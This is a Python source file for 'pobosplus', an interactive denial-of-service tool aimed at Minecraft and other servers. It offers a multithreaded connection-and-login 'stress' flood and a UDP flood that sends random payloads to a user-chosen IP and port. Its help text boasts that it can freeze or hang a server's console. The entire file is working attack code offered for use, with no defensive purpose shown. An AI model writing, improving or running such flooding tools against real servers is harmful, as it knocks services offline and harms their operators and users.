import socket
import threading
import time
import sys
import os
import random
import struct

def set_title(title):
    if os.name == "nt":
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()

def ascii_art():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[32m
               __                              ___                      
              /\\ \\                            /\\_ \\                     
 _____     ___\\ \\ \\____    ___     ____  _____\\//\\ \\    __  __    ____  
/\\ '__`\\  / __`\\ \\ '__`\\  / __`\\  /',__\\/\\ '__`\\\\ \\ \\  /\\ \\/\\ \\  /',__\\ 
\\ \\ \\L\\ \\/\\ \\L\\ \\ \\ \\L\\ \\/\\ \\L\\ \\/\\__, `\\ \\ \\L\\ \\\\_\\ \\_\\ \\ \\_\\ \\/\\__, `\\
 \\ \\ ,__/\\ \\____/\\ \\_,__/\\ \\____/\\/\\____/\\ \\ ,__//\\____\\\\ \\____/\\/\\____/
  \\ \\ \\/  \\/___/  \\/___/  \\/___/  \\/___/  \\ \\ \\/  \\/____/ \\/___/  \\/___/ 
   \\ \\_\\                                   \\ \\_\\                        
    \\/_/                                    \\/_/  by Artline | Version: v1.0
                                                
                                                                                             
\033[0m""")

def minecraft_stress(ip, port, duration, thread_count, high_speed=False):
    total_packets_sent = 0

    def handshake(sock):
        try:
            handshake_packet = (
                b'\x00' +                                      
                b'\x00' +                                      
                b'\x00' +                                      
                varint(len(ip)) +                             
                ip.encode('utf-8') +                          
                port.to_bytes(2, 'big')                        
            )
            packet_length = varint(len(handshake_packet))
            sock.send(packet_length + handshake_packet)
            return True
        except Exception as e:
            print("Handshake error:", e)
            return False

    def login_start(sock):
        try:
            login_start_packet = (
                b'\x00' +                                      
                b'\x07' +                                      
                b'Player'                                      
            )
            packet_length = varint(len(login_start_packet))
            sock.send(packet_length + login_start_packet)
            return True
        except Exception as e:
            print("Login start error:", e)
            return False

    def stress():
        nonlocal total_packets_sent
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                if sock.connect_ex((ip, port)) == 0:
                    if handshake(sock) and login_start(sock):
                        total_packets_sent += 1
                        print(f"Sent STRESS packet to {ip}:{port} [Total packets sent: {total_packets_sent}]")
                else:
                    print("Failed to connect to the target.")
            except Exception as e:
                print("An error occurred:", e)
            finally:
                sock.close()

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=stress)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"Total successful packets sent: {total_packets_sent}")

def varint(data):
    """Convert an integer to Minecraft VarInt format."""
    output = b""
    while True:
        byte = data & 0x7F
        data >>= 7
        output += bytes([(byte | 0x80) if data > 0 else byte])
        if data == 0:
            break
    return output

def udp_flood(target_ip, target_port, duration, packet_size=4096):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    duration = time.time() + duration
    packets_sent = 0
    try:
        while True:
            if time.time() > duration:
                break
            else:
                bytes = os.urandom(packet_size)
                udp_socket.sendto(bytes, (target_ip, target_port))
                packets_sent += 1
                print(
                    f"Sent UDP packet to {target_ip}:{target_port} [Total packets sent: {packets_sent}]"
                )
    except KeyboardInterrupt:
        print("Attack stopped by user (CTRL + C)")

    udp_socket.close()

def main():
    set_title("pobosplus v1")
    ascii_art()
    
    while True:
        print("\n[+] Choose method attack:")
        print("1. Stress")
        print("2. UDP Flood")
        print("3. Help")
        print("0. Exit")
        method_choice = input("\nSelect a method: ")

        if method_choice == "1":
            ip = input("Target IP: ")
            port = int(input("Target Port: "))
            duration = int(input("Duration (seconds): "))
            thread_count = int(input("Number of Threads: "))

            print("Starting stress...")
            minecraft_stress(ip, port, duration, thread_count)
            print("Stress completed.")
        elif method_choice == "2":
            ip = input("Target IP: ")
            port = int(input("Target Port: "))
            duration = int(input("Duration (seconds): "))
            
            print("Starting UDP flood...")
            udp_flood(ip, port, duration)
            print("UDP flood completed.")
        elif method_choice == "3":
            print("\n[+] Help")
            print("This method might not crash the game server, but it can still freeze or hang the server's console or panel.")
            print("Choose a method attack, then enter the required parameters.")
            print("For stress attack, provide the target IP, port, duration, and number of threads.")
            print("For UDP flood, provide the target IP, port, and duration,and number of threads.")
            print("About & Discord: black4down")
            print("")
        elif method_choice == "0":
            os.system('cls' if os.name == 'nt' else 'clear')
            sys.exit("Exiting...")
        else:
            print("Invalid method choice.")

if __name__ == "__main__":
    main()